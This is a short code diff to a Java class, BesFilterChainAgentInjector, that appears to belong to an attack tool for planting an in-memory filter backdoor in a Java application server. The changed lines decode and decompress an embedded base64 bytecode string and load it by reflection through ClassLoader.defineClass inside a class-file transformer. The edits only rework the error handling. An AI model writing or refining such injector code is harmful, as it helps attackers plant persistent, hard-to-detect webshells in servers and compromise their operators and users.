@@ -164,19 +164,15 @@ public class BesFilterChainAgentInjector implements ClassFileTransformer {
     }
 
     @SuppressWarnings("all")
-    public static byte[] decodeBase64(String base64Str) {
+    public static byte[] decodeBase64(String base64Str) throws Exception {
         Class<?> decoderClass;
         try {
             decoderClass = Class.forName("java.util.Base64");
             Object decoder = decoderClass.getMethod("getDecoder").invoke(null);
             return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, base64Str);
         } catch (Exception ignored) {
-            try {
-                decoderClass = Class.forName("sun.misc.BASE64Decoder");
-                return (byte[]) decoderClass.getMethod("decodeBuffer", String.class).invoke(decoderClass.newInstance(), base64Str);
-            } catch (Exception e) {
-                throw new RuntimeException(e);
-            }
+            decoderClass = Class.forName("sun.misc.BASE64Decoder");
+            return (byte[]) decoderClass.getMethod("decodeBuffer", String.class).invoke(decoderClass.newInstance(), base64Str);
         }
     }
 
@@ -212,8 +208,8 @@ public class BesFilterChainAgentInjector implements ClassFileTransformer {
             return;
         } catch (ClassNotFoundException ignored) {
         }
-        byte[] classBytecode = gzipDecompress(decodeBase64(getBase64String()));
         try {
+            byte[] classBytecode = gzipDecompress(decodeBase64(getBase64String()));
             java.lang.reflect.Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
             defineClass.setAccessible(true);
             defineClass.invoke(loader, classBytecode, 0, classBytecode.length);
